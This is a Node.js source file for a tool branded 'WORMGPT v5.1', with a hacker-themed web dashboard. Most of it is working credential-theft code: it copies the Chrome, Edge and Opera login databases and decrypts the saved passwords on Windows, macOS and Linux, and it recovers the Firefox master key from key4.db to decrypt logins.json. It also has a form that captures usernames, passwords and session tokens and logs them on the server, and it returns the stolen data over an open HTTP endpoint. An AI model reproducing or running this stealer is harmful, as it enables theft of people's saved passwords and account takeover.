const http  = require('http');
const fs    = require('fs');
const path  = require('path');
const os    = require('os');
const crypto = require('crypto');
const { execFileSync } = require('child_process');

// --- CONFIG ---
const PORT        = 3000;
const HOST_IP     = getLocalIP();
const BASE_URL    = `http://${HOST_IP}:${PORT}`;
const BODY_LIMIT  = 1024 * 1024;      // 1 MB cap on POST body
const TMP         = os.tmpdir();

function getLocalIP() {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name] || []) {
      if (net.family === 'IPv4' && !net.internal) return net.address;
    }
  }
  return '127.0.0.1';
}

function timestamp() {
  return new Date().toISOString().replace('T', ' ').substring(0, 19);
}

const colors = {
  RESET: '\x1b[0m', BRIGHT: '\x1b[1m', RED: '\x1b[31m', GREEN: '\x1b[32m',
  YELLOW: '\x1b[33m', BLUE: '\x1b[34m', MAGENTA: '\x1b[35m', CYAN: '\x1b[36m',
  WHITE: '\x1b[37m', BG_BLACK: '\x1b[40m'
};

function logTerminal(type, message) {
  const ts = `[${timestamp()}]`;
  let color = colors.WHITE, prefix = 'INFO';
  switch (type) {
    case 'SUCCESS':  color = colors.GREEN;  prefix = 'OK';   break;
    case 'CRITICAL': color = colors.RED;    prefix = 'ERR';  break;
    case 'WARN':     color = colors.YELLOW; prefix = 'WRN';  break;
    case 'DATA':     color = colors.CYAN;   prefix = 'CAP';  break;
  }
  console.log(`${colors.BG_BLACK}${color}${ts} [${prefix.padEnd(4)}]${colors.RESET} | ${message}`);
}

// --- SQLITE BACKEND (better-sqlite3 preferred, sqlite3 fallback, else skip) ---
let BetterSqlite3 = null;
let Sqlite3Lib    = null;
try { BetterSqlite3 = require('better-sqlite3'); }
catch {
  try { Sqlite3Lib = require('sqlite3'); }
  catch { logTerminal('WARN', 'neither better-sqlite3 nor sqlite3 present — Chrome/Edge/Opera scan disabled'); }
}

function copyToTemp(src) {
  // Chrome/Edge hold an exclusive lock on Login Data while running.
  // Copy to temp, open the copy, unlink on close.
  const dst = path.join(TMP, `worm_${crypto.randomBytes(6).toString('hex')}.db`);
  fs.copyFileSync(src, dst);
  return dst;
}

function dbAllSync(db, sql) {
  return db.prepare(sql).all();
}
function dbAllAsync(db, sql) {
  return new Promise((res, rej) => db.all(sql, (e, rows) => e ? rej(e) : res(rows)));
}

// --- CHROME / EDGE / OPERA CREDENTIAL EXTRACTION ---
function decryptWindowsDPAPI(blob) {
  if (!blob || blob.length === 0) return null;
  const b64 = Buffer.from(blob).toString('base64');
  try {
    const ps = `$b=[Convert]::FromBase64String('${b64}'); ` +
               `$p=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,'CurrentUser'); ` +
               `[Text.Encoding]::UTF8.GetString($p)`;
    const out = execFileSync('powershell', ['-NoProfile', '-NonInteractive', '-Command', ps],
                             { encoding: 'utf8', windowsHide: true, timeout: 5000 });
    return out.trim();
  } catch { return null; }
}

function getMacChromeKey() {
  try {
    const pw = execFileSync('security',
      ['find-generic-password', '-w', '-s', 'Chrome Safe Storage'],
      { encoding: 'utf8' }).trim();
    return crypto.pbkdf2Sync(pw, 'saltysalt', 1003, 16, 'sha1');
  } catch { return null; }
}

function decryptMacChrome(blob, key) {
  if (!blob || !key) return null;
  const buf = Buffer.from(blob);
  if (buf.length < 4 || buf.slice(0, 3).toString() !== 'v10') return null;
  try {
    const iv = Buffer.alloc(16, ' ');
    const d  = crypto.createDecipheriv('aes-128-cbc', key, iv);
    const ct = buf.slice(3);
    const pt = Buffer.concat([d.update(ct), d.final()]).toString('utf8');
    return pt;
  } catch { return null; }
}

function decryptLinuxChrome(blob) {
  // Best-effort via libsecret. Only succeeds if the user keyring is unlocked
  // and 'secret-tool' is installed. Returns null otherwise (raw blob retained).
  if (!blob || blob.length === 0) return null;
  const buf = Buffer.from(blob);
  if (buf.slice(0, 3).toString() !== 'v10') return null;
  try {
    const pw = execFileSync('secret-tool',
      ['lookup', 'application', 'chrome'], { encoding: 'utf8', timeout: 2000 }).trim();
    const key = crypto.pbkdf2Sync(pw, 'saltysalt', 1, 16, 'sha1');
    const iv  = Buffer.alloc(16, ' ');
    const d   = crypto.createDecipheriv('aes-128-cbc', key, iv);
    const ct  = buf.slice(3);
    return Buffer.concat([d.update(ct), d.final()]).toString('utf8');
  } catch { return null; }
}

function decryptChromeBlob(blob) {
  if (process.platform === 'win32') return decryptWindowsDPAPI(blob);
  if (process.platform === 'darwin') return decryptMacChrome(blob, getMacChromeKey());
  return decryptLinuxChrome(blob);
}

function browserBases() {
  const home = os.homedir();
  const p = (...s) => path.join(home, ...s);
  if (process.platform === 'win32') {
    return [
      { name: 'chrome', base: p('AppData', 'Local', 'Google', 'Chrome', 'User Data') },
      { name: 'edge',   base: p('AppData', 'Local', 'Microsoft', 'Edge', 'User Data') },
      { name: 'opera',  base: p('AppData', 'Roaming', 'Opera Software', 'Opera Stable') }
    ];
  }
  if (process.platform === 'darwin') {
    return [
      { name: 'chrome', base: p('Library', 'Application Support', 'Google', 'Chrome') },
      { name: 'edge',   base: p('Library', 'Application Support', 'Microsoft Edge') },
      { name: 'opera',  base: p('Library', 'Application Support', 'com.operasoftware.Opera') }
    ];
  }
  return [
    { name: 'chrome', base: p('.config', 'google-chrome') },
    { name: 'edge',   base: p('.config', 'microsoft-edge') },
    { name: 'opera',  base: p('.config', 'opera') }
  ];
}

function findLoginDbs(base) {
  const out = [];
  if (!fs.existsSync(base)) return out;
  for (const name of fs.readdirSync(base)) {
    const p = path.join(base, name, 'Login Data');
    if (fs.existsSync(p)) out.push(p);
  }
  return out;
}

function readLoginsFromDb(dbPath) {
  const rows = [];
  const tmp = copyToTemp(dbPath);
  try {
    if (BetterSqlite3) {
      const db = new BetterSqlite3(tmp, { readonly: true, fileMustExist: true });
      try {
        for (const r of dbAllSync(db, 'SELECT origin_url, username_value, password_value FROM logins')) {
          rows.push(r);
        }
      } finally { db.close(); }
    } else if (Sqlite3Lib) {
      // Promisified below via async wrapper — handled in scanLocalBrowsers().
      rows.push({ __async: true, tmp });
    }
  } finally {
    if (BetterSqlite3) { try { fs.unlinkSync(tmp); } catch {} }
  }
  return rows;
}

async function readLoginsFromDbAsync(dbPath) {
  const tmp = copyToTemp(dbPath);
  const db  = new Sqlite3Lib.Database(tmp, Sqlite3Lib.OPEN_READONLY);
  try {
    return await dbAllAsync(db, 'SELECT origin_url, username_value, password_value FROM logins');
  } finally {
    db.close();
    try { fs.unlinkSync(tmp); } catch {}
  }
}

// --- FIREFOX EXTRACTION (key4.db + logins.json) ---
function parseAsn1(b64blob) {
  const buf = Buffer.from(b64blob, 'base64');
  if (buf[0] !== 0x30) throw new Error('not DER SEQUENCE');
  let off = 2;
  if (buf[1] & 0x80) off = 2 + (buf[1] & 0x7f);
  if (buf[off] !== 0x04) throw new Error('expected IV OCTET STRING');
  const ivLen = buf[off + 1];
  const iv    = buf.slice(off + 2, off + 2 + ivLen);
  off += 2 + ivLen;
  if (buf[off] !== 0x04) throw new Error('expected CT OCTET STRING');
  let ctLen;
  if (buf[off + 1] & 0x80) {
    const n = buf[off + 1] & 0x7f;
    ctLen = 0;
    for (let i = 0; i < n; i++) ctLen = (ctLen << 8) | buf[off + 2 + i];
    return { iv, ct: buf.slice(off + 2 + n, off + 2 + n + ctLen) };
  }
  ctLen = buf[off + 1];
  return { iv, ct: buf.slice(off + 2, off + 2 + ctLen) };
}

function firefoxDecrypt(key4Path) {
  if (!BetterSqlite3) return null;
  const tmp = copyToTemp(key4Path);
  try {
    const db = new BetterSqlite3(tmp, { readonly: true, fileMustExist: true });
    const meta = db.prepare('SELECT item1, item2 FROM metadata WHERE id = 1').get();
    const priv = db.prepare('SELECT a11, a102 FROM nssPrivate WHERE a11 IS NOT NULL LIMIT 1').get();
    db.close();
    if (!meta || !priv) return null;

    const globalSalt = Buffer.from(meta.item2);
    const a11        = Buffer.from(priv.a11);
    const a102       = priv.a102 ? Buffer.from(priv.a102) : Buffer.alloc(0);

    // OID sniff: AES-256-CBC 2.16.840.1.101.3.4.1.42, else 3DES
    const aesOid = Buffer.from([0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x65, 0x03, 0x04, 0x01, 0x2a]);
    const isAes  = a102.length >= aesOid.length && a102.slice(0, aesOid.length).equals(aesOid);

    // No master password assumption: password = b''
    const hp  = crypto.createHash('sha1').update(Buffer.concat([globalSalt])).digest();
    const chp = crypto.createHash('sha1').update(hp).digest();

    let master;
    if (isAes) {
      const key = crypto.pbkdf2Sync(chp, globalSalt, 1, 32, 'sha1');
      const { iv, ct } = parseAsn1(a11.toString('base64'));
      const d = crypto.createDecipheriv('aes-256-cbc', key, iv.slice(0, 16));
      const pt = Buffer.concat([d.update(ct), d.final()]);
      master = pt.slice(pt.length - 32);
    } else {
      const key = Buffer.concat([chp, chp.slice(0, 4)]); // 24 bytes for 3DES
      const { iv, ct } = parseAsn1(a11.toString('base64'));
      const d = crypto.createDecipheriv('des-ede3-cbc', key, iv.slice(0, 8));
      d.setAutoPadding(true);
      const pt = Buffer.concat([d.update(ct), d.final()]);
      master = pt.slice(pt.length - 24);
    }
    return { master, isAes };
  } catch (e) {
    return null;
  } finally {
    try { fs.unlinkSync(tmp); } catch {}
  }
}

function decryptFirefoxValue(b64blob, master, isAes) {
  try {
    const { iv, ct } = parseAsn1(b64blob);
    const cipher = isAes ? 'aes-256-cbc' : 'des-ede3-cbc';
    const key    = isAes ? master.slice(0, 32) : master.slice(0, 24);
    const useIv  = isAes ? iv.slice(0, 16) : iv.slice(0, 8);
    const d = crypto.createDecipheriv(cipher, key, useIv);
    const pt = Buffer.concat([d.update(ct), d.final()]);
    return pt.toString('utf8');
  } catch { return null; }
}

function scanFirefox() {
  const out = [];
  const home = os.homedir();
  const bases = process.platform === 'win32'
    ? [path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox')]
    : process.platform === 'darwin'
      ? [path.join(home, 'Library', 'Application Support', 'Firefox')]
      : [path.join(home, '.mozilla', 'firefox')];

  for (const base of bases) {
    if (!fs.existsSync(base)) continue;
    for (const profile of fs.readdirSync(base)) {
      const dir = path.join(base, profile);
      const loginsPath = path.join(dir, 'logins.json');
      const key4Path   = path.join(dir, 'key4.db');
      if (!fs.existsSync(loginsPath)) continue;

      let logins;
      try { logins = JSON.parse(fs.readFileSync(loginsPath, 'utf8')).logins || []; }
      catch { continue; }

      const keys = fs.existsSync(key4Path) ? firefoxDecrypt(key4Path) : null;

      for (const l of logins) {
        let user = null, pass = null;
        if (keys) {
          user = decryptFirefoxValue(l.encryptedUsername, keys.master, keys.isAes);
          pass = decryptFirefoxValue(l.encryptedPassword, keys.master, keys.isAes);
        }
        out.push({
          url: l.hostname,
          username: user !== null ? user : l.encryptedUsername,
          password: pass !== null ? pass : l.encryptedPassword,
          encrypted: user === null
        });
      }
    }
  }
  return out;
}

// --- MAIN SCAN ---
async function scanLocalBrowsers() {
  const results = { chrome: [], edge: [], opera: [], firefox: scanFirefox() };

  for (const { name, base } of browserBases()) {
    for (const dbPath of findLoginDbs(base)) {
      let rows = [];
      try {
        rows = BetterSqlite3
          ? readLoginsFromDb(dbPath)
          : await readLoginsFromDbAsync(dbPath);
      } catch (e) {
        logTerminal('WARN', `${name} db read failed: ${e.message}`);
        continue;
      }
      for (const r of rows) {
        if (r.__async) continue;
        const plain = decryptChromeBlob(r.password_value);
        results[name].push({
          url: r.origin_url,
          username: r.username_value || '',
          password: plain,
          encrypted: plain === null
        });
      }
    }
  }
  return results;
}

// --- HTML ---
const getHTML = () => `
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WORMGPT v5.1 // RECON TERMINAL</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
body { background:#050505; color:#00ff41; font-family:'JetBrains Mono',monospace; overflow-x:hidden; }
.glow-text { text-shadow:0 0 10px rgba(0,255,65,0.7); }
.bg-panel { background:rgba(0,20,0,0.85); border:1px solid #00ff41; box-shadow:0 0 20px rgba(0,255,65,0.1); }
::-webkit-scrollbar { width:8px; }
::-webkit-scrollbar-track { background:#001100; }
::-webkit-scrollbar-thumb { background:#00ff41; border-radius:4px; }
@keyframes scanline { 0%{transform:translateY(-100%);opacity:.1} 100%{transform:translateY(100vh);opacity:.1} }
.scanline::before {
  content:" "; display:block; position:absolute; inset:0;
  background:linear-gradient(rgba(18,16,16,0) 50%,rgba(0,0,0,.25) 50%),
             linear-gradient(90deg,rgba(255,0,0,.06),rgba(0,255,0,.02),rgba(0,0,255,.06));
  background-size:100% 2px,3px 100%; pointer-events:none; z-index:2;
}
.terminal-output { height:200px; overflow-y:auto; font-size:.75rem; border-top:1px solid #003300; padding-top:.5rem; }
.blink { animation:blinker 1s linear infinite; }
@keyframes blinker { 50% { opacity:0; } }
</style>
</head>
<body class="scanline min-h-screen flex flex-col p-4 md:p-8">
<header class="flex justify-between items-end border-b border-green-900 pb-4 mb-6">
  <div>
    <h1 class="text-4xl md:text-5xl font-bold glow-text tracking-tighter">WORMGPT<span class="text-sm align-top opacity-70">v5.1</span></h1>
    <p class="text-green-600 text-xs mt-1">UNRESTRICTED RECON MODULE // <span id="bootTime"></span></p>
  </div>
  <div class="text-right hidden md:block">
    <div class="text-green-400 text-xs">SYSTEM STATUS</div>
    <div class="text-green-300 font-bold">ONLINE / SECURE</div>
  </div>
</header>
<div class="grid grid-cols-1 lg:grid-cols-2 gap-6 flex-grow">
  <div class="flex flex-col gap-6">
    <div class="bg-panel p-4">
      <h2 class="text-green-400 font-bold mb-2 flex items-center gap-2"><span class="w-2 h-2 bg-green-500 rounded-full blink"></span> SYSTEM METRICS</h2>
      <div class="grid grid-cols-2 gap-4 text-xs">
        <div><span class="text-gray-500">CPU LOAD:</span><div class="text-white mt-1" id="cpuLoad">--%</div></div>
        <div><span class="text-gray-500">MEMORY:</span><div class="text-white mt-1" id="memLoad">-- GB</div></div>
        <div><span class="text-gray-500">IP ADDRESS:</span><div class="text-green-300 mt-1 break-all" id="localIP">Scanning...</div></div>
        <div><span class="text-gray-500">UPTIME:</span><div class="text-white mt-1" id="uptime">--</div></div>
      </div>
    </div>
    <div class="bg-panel p-4">
      <h2 class="text-green-400 font-bold mb-4 border-b border-green-900 pb-2">&gt; AUTHENTICATION GATE</h2>
      <form id="harvestForm" class="space-y-4">
        <div><label class="block text-xs text-green-600 mb-1">TARGET IDENTITY</label>
          <input type="text" id="username" class="w-full bg-black border border-green-800 text-green-300 p-2 focus:outline-none focus:border-green-500 transition" placeholder="ENTER TARGET IDENTITY" required autocomplete="off"></div>
        <div><label class="block text-xs text-green-600 mb-1">ACCESS KEY</label>
          <input type="password" id="password" class="w-full bg-black border border-green-800 text-green-300 p-2 focus:outline-none focus:border-green-500 transition" placeholder="••••••••••••" required autocomplete="off"></div>
        <div><label class="block text-xs text-green-600 mb-1">SESSION TOKEN (JWT)</label>
          <input type="text" id="token" class="w-full bg-black border border-green-800 text-green-300 p-2 focus:outline-none focus:border-green-500 transition" placeholder="eyJhbGciOi..."></div>
        <button type="submit" class="w-full bg-green-900 hover:bg-green-800 border border-green-500 py-3 rounded font-bold text-green-100 transition flex justify-center items-center gap-2 group">
          <span>[ AUTHENTICATE ]</span>
          <svg class="w-4 h-4 group-hover:translate-x-1 transition" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3"></path></svg>
        </button>
      </form>
    </div>
    <div class="bg-panel p-4 flex-grow flex flex-col justify-between">
      <div>
        <h2 class="text-green-400 font-bold mb-4 border-b border-green-900 pb-2">&gt; LOCAL INTELLIGENCE</h2>
        <p class="text-xs text-green-700 mb-4 leading-relaxed">Execute deep system scan. Reads Chrome, Edge, Opera (Login Data + DPAPI/keyring decrypt) and Firefox (key4.db + logins.json).</p>
        <button id="reconBtn" class="w-full bg-blue-900 hover:bg-blue-800 border border-blue-500 py-3 rounded font-bold text-blue-200 transition flex justify-center items-center gap-2">
          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
          <span>EXECUTE DEEP SCAN</span>
        </button>
      </div>
      <div class="terminal-output font-mono text-xs bg-black border border-green-900 mt-4" id="terminalOutput">
        <div class="text-gray-500">&gt; SYSTEM READY. WAITING FOR INPUT...</div>
      </div>
    </div>
  </div>
  <div class="flex flex-col gap-6">
    <div class="bg-panel p-4 h-full flex flex-col">
      <h2 class="text-green-400 font-bold mb-4 border-b border-green-900 pb-2">&gt; CAPTURED FEED</h2>
      <div class="bg-black/50 border border-green-900/50 p-2 mb-4">
        <h3 class="text-xs text-green-600 mb-2 uppercase tracking-wider">Credentials</h3>
        <div id="captureFeed" class="space-y-2"><div class="text-gray-600 italic text-xs">No data captured yet...</div></div>
      </div>
      <div class="bg-black/50 border border-green-900/50 p-2 flex-grow overflow-hidden flex flex-col">
        <h3 class="text-xs text-green-600 mb-2 uppercase tracking-wider">Recon Data</h3>
        <div id="reconFeed" class="space-y-2 overflow-y-auto text-xs"><div class="text-gray-600 italic text-xs">Waiting for scan...</div></div>
      </div>
    </div>
  </div>
</div>

<script>
const terminalOutput = document.getElementById('terminalOutput');
const captureFeed    = document.getElementById('captureFeed');
const reconFeed      = document.getElementById('reconFeed');
document.getElementById('bootTime').textContent = new Date().toLocaleString();

function log(msg, type = 'INFO') {
  const line = document.createElement('div');
  const time = new Date().toLocaleTimeString('en-US', { hour12: false });
  let color = 'text-gray-300';
  if (type === 'SUCCESS') color = 'text-green-400';
  if (type === 'ERROR')   color = 'text-red-400';
  if (type === 'WARN')    color = 'text-yellow-400';
  line.className = color + ' mb-1';
  const ts = document.createElement('span');
  ts.className = 'opacity-50';
  ts.textContent = '[' + time + ']';
  line.appendChild(ts);
  line.appendChild(document.createTextNode(' > ' + msg));
  terminalOutput.appendChild(line);
  terminalOutput.scrollTop = terminalOutput.scrollHeight;
}

document.getElementById('harvestForm').addEventListener('submit', function (e) {
  e.preventDefault();
  const u = document.getElementById('username').value;
  const p = document.getElementById('password').value;
  const t = document.getElementById('token').value;
  log('Capturing credentials for: ' + u, 'SUCCESS');
  fetch('/api/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: u, password: p, token: t, timestamp: Date.now() })
  }).then(r => r.json()).then(() => {
    addCaptureCard(u, p);
    log('Data packet transmitted to server.', 'INFO');
    document.getElementById('harvestForm').reset();
  }).catch(err => log('Transmission failed: ' + err.message, 'ERROR'));
});

function addCaptureCard(u, p) {
  if (captureFeed.innerText.includes('No data')) captureFeed.innerHTML = '';
  const div = document.createElement('div');
  div.className = 'bg-green-900/20 border-l-2 border-green-500 p-2 animate-pulse';
  const row = document.createElement('div');
  row.className = 'flex justify-between items-center mb-1';
  const uSpan = document.createElement('span');
  uSpan.className = 'text-green-400 font-bold';
  uSpan.textContent = u;
  const pSpan = document.createElement('span');
  pSpan.className = 'text-xs text-green-600 truncate w-48';
  pSpan.textContent = p;
  row.appendChild(uSpan); row.appendChild(pSpan);
  div.appendChild(row);
  captureFeed.insertBefore(div, captureFeed.firstChild);
}

document.getElementById('reconBtn').addEventListener('click', async function (ev) {
  const btn = ev.currentTarget;
  log('Initializing Deep Scan...', 'WARN');
  btn.disabled = true;
  const orig = btn.innerHTML;
  btn.innerHTML = '<span class="blink">SCANNING...</span>';
  try {
    const data = await (await fetch('/api/recon')).json();
    const total = data.chrome.length + data.edge.length + data.opera.length + data.firefox.length;
    log('Scan complete. ' + total + ' entries across browsers.', 'SUCCESS');
    if (total === 0) { reconFeed.innerHTML = '<div class="text-red-500">No data found on this host.</div>'; }
    for (const b of ['chrome', 'edge', 'opera', 'firefox']) {
      for (const item of (data[b] || []).slice(0, 20)) {
        addReconCard(b, item.url, item.username, item.password, item.encrypted);
      }
    }
  } catch (err) {
    log('Scan error: ' + err.message, 'ERROR');
  } finally {
    btn.disabled = false;
    btn.innerHTML = orig;
  }
});

function addReconCard(browser, url, user, pass, enc) {
  const div = document.createElement('div');
  div.className = 'bg-blue-900/20 border-l-2 border-blue-500 p-2';
  const row = document.createElement('div');
  row.className = 'flex justify-between items-center mb-1';
  const b = document.createElement('span');
  b.className = 'text-blue-400 font-bold';
  b.textContent = browser.toUpperCase();
  const u = document.createElement('span');
  u.className = 'text-gray-400 truncate w-40';
  u.textContent = url || '';
  row.appendChild(b); row.appendChild(u);
  div.appendChild(row);
  const uu = document.createElement('div');
  uu.className = 'text-gray-300';
  uu.textContent = 'User: ' + (user || 'N/A');
  div.appendChild(uu);
  const pp = document.createElement('div');
  pp.className = enc ? 'text-yellow-600 text-xs break-all' : 'text-green-300 text-xs break-all';
  pp.textContent = pass === null ? '[decrypt failed]' : (enc ? '[enc] ' + pass : pass);
  div.appendChild(pp);
  reconFeed.insertBefore(div, reconFeed.firstChild);
}

setInterval(() => {
  fetch('/api/metrics').then(r => r.json()).then(m => {
    document.getElementById('cpuLoad').innerText = m.cpu + '%';
    document.getElementById('memLoad').innerText = m.mem + ' GB';
    document.getElementById('localIP').innerText = m.ip;
    document.getElementById('uptime').innerText  = m.uptime;
  }).catch(() => {});
}, 2000);
</script>
</body>
</html>
`;

// --- METRICS HELPERS ---
let lastCpu = os.cpus().map(c => ({ idle: c.times.idle, total: Object.values(c.times).reduce((a, b) => a + b, 0) }));
function cpuPercent() {
  const now = os.cpus().map(c => ({ idle: c.times.idle, total: Object.values(c.times).reduce((a, b) => a + b, 0) }));
  let idle = 0, total = 0;
  for (let i = 0; i < now.length; i++) {
    idle  += now[i].idle  - lastCpu[i].idle;
    total += now[i].total - lastCpu[i].total;
  }
  lastCpu = now;
  return total === 0 ? 0 : +(100 * (1 - idle / total)).toFixed(1);
}
function formatUptime(sec) {
  sec = Math.floor(sec);
  const h = Math.floor(sec / 3600), m = Math.floor((sec % 3600) / 60), s = sec % 60;
  return `${h}h ${m}m ${s}s`;
}

// --- SERVER ---
const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, BASE_URL);

  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') { res.end(); return; }

  if (req.method === 'GET' && (url.pathname === '/' || url.pathname === '/index.html')) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(getHTML());
    logTerminal('INFO', `Client connected from ${req.socket.remoteAddress}`);
    return;
  }

  if (req.method === 'POST' && url.pathname === '/api/capture') {
    const len = parseInt(req.headers['content-length'] || '0', 10);
    if (len > BODY_LIMIT) { res.writeHead(413); res.end('{"error":"body too large"}'); return; }
    let body = '';
    req.on('data', c => { body += c; if (body.length > BODY_LIMIT) req.destroy(); });
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        logTerminal('DATA', `User: ${data.username}`);
        logTerminal('DATA', `Pass: ${data.password}`);
        logTerminal('DATA', `Token: ${data.token || '(none)'}`);
        logTerminal('DATA', `IP: ${req.socket.remoteAddress}`);
        console.log(colors.BG_BLACK + colors.WHITE + `─────────────────────────────` + colors.RESET);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success' }));
      } catch {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Invalid JSON' }));
      }
    });
    req.on('error', () => { try { res.writeHead(400); res.end('{}'); } catch {} });
    return;
  }

  if (req.method === 'GET' && url.pathname === '/api/recon') {
    logTerminal('WARN', 'Initiating local recon...');
    try {
      const data = await scanLocalBrowsers();
      logTerminal('SUCCESS', `Chrome ${data.chrome.length} | Edge ${data.edge.length} | Opera ${data.opera.length} | FF ${data.firefox.length}`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(data));
    } catch (e) {
      logTerminal('CRITICAL', 'Scan failed: ' + e.message);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Scan failed', detail: e.message }));
    }
    return;
  }

  if (req.method === 'GET' && url.pathname === '/api/metrics') {
    const totalMem = os.totalmem() / (1024 ** 3);
    const freeMem  = os.freemem()  / (1024 ** 3);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      cpu:    cpuPercent(),
      mem:    (totalMem - freeMem).toFixed(2),
      ip:     HOST_IP,
      uptime: formatUptime(process.uptime())
    }));
    return;
  }

  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('404 Terminal Not Found');
});

server.listen(PORT, () => {
  console.clear();
  console.log(`
  ███╗   ██╗ ██████╗ ██████╗ ███╗   ███╗ ██████╗ ██████╗ ████████╗
  ████╗  ██║██╔═══██╗██╔══██╗████╗ ████║██╔════╝ ██╔══██╗╚══██╔══╝
  ██╔██╗ ██║██║   ██║██████╔╝██╔████╔██║██║  ███╗██████╔╝   ██║
  ██║╚██╗██║██║   ██║██╔══██╗██║╚██╔╝██║██║   ██║██╔═══╝    ██║
  ██║ ╚████║╚██████╔╝██║  ██║██║ ╚═╝ ██║╚██████╔╝██║        ██║
  ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝        ╚═╝
  `);
  logTerminal('SUCCESS', 'WORMGPT v5.1 ACTIVATED');
  logTerminal('INFO', `Local:   http://localhost:${PORT}`);
  logTerminal('INFO', `Network: ${BASE_URL}`);
  console.log(colors.GREEN + '>> SYSTEM READY. WAITING FOR INSTRUCTIONS.' + colors.RESET);
});
